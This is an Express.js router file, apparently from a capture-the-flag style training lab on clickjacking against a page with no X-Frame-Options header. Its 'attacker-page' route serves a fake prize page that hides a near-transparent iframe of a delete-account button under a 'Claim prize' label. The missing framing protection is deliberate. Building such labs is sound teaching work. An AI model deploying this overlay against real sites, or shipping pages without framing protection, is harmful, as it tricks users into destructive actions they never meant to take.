'use strict';

const express = require('express');
const { resetLabState } = require('./lib/lab-helpers');

const router = express.Router();

router.get('/', (req, res) => {
  res.render('labs/clickjacking-missing-xfo', {
    deleted: req.lab.state.deleted === true,
    framed: false,
    flag: null
  });
});

router.post('/delete-account', async (req, res) => {
  const framed = req.body.framed === '1' || String(req.get('Referer') || '').includes('/frame-target');
  req.lab.state.deleted = true;
  req.lab.state.framed = framed;
  await req.lab.save();
  return res.redirect(framed
    ? '/labs/clickjacking-missing-xfo/frame-target'
    : '/labs/clickjacking-missing-xfo');
});

router.get('/attacker-page', (req, res) => {
  res.set('Content-Type', 'text/html');
  res.send(`<!doctype html><html><head><meta charset="utf-8"><title>Prize Center</title>
  <style>
    body{font-family:system-ui,sans-serif;background:#101326;color:#eef1ff;display:grid;place-items:center;height:100vh;margin:0}
    .wrap{text-align:center}
    .stage{position:relative;width:320px;height:70px;margin:1.5rem auto}
    iframe{position:absolute;inset:0;width:320px;height:70px;border:0;opacity:0.001;z-index:2}
    .label{position:absolute;inset:0;display:grid;place-items:center;background:#2563eb;border-radius:10px;font-weight:700;pointer-events:none}
  </style></head><body><div class="wrap">
    <h1>You won a prize!</h1><p>Click the button to claim it.</p>
    <div class="stage">
      <iframe src="/labs/clickjacking-missing-xfo/frame-target" title="claim"></iframe>
      <div class="label">Claim prize</div>
    </div>
    <p style="color:#8f9bb3;max-width:360px">The framed page has no X-Frame-Options and its delete button sits under the visible prize label.</p>
  </div></body></html>`);
});

router.get('/frame-target', (req, res) => {
  res.render('labs/clickjacking-missing-xfo', {
    deleted: req.lab.state.deleted === true,
    framed: true,
    flag: req.lab.state.deleted === true && req.lab.state.framed === true ? req.lab.flag() : null
  });
});

router.post('/reset', async (req, res) => {
  await resetLabState(req);
  res.redirect('/labs/clickjacking-missing-xfo');
});

module.exports = router;
